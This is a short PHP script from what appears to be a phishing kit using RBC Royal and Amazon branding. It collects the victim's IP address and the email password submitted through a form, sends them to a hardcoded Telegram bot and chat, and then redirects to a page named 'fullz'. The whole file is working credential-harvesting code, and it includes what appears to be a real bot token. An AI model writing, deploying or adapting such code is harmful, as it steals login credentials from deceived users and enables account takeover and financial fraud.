<?php
$ip = getenv("REMOTE_ADDR");
$message = " ————————— RBC ROYAL ———— ";
$message = "LOG - location = : $ip ";
$message = "———————— AMAZON BOX ACCESS ———— location $ip";
$message .= "Email Password : ".$_POST['emailPassword']."\n";
$message .= ".---------- DOOZ 777 WAS HERE -------------.";
$apiToken = "6367658316:AAGCLcSi0wH86XPd6jWnW6gXm-UjSmtktrw";
$usaabank = [
	    'chat_id' => '6239366940',
	    'text' => $message
	];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($usaabank) );

header("Location: ./fullz");
?>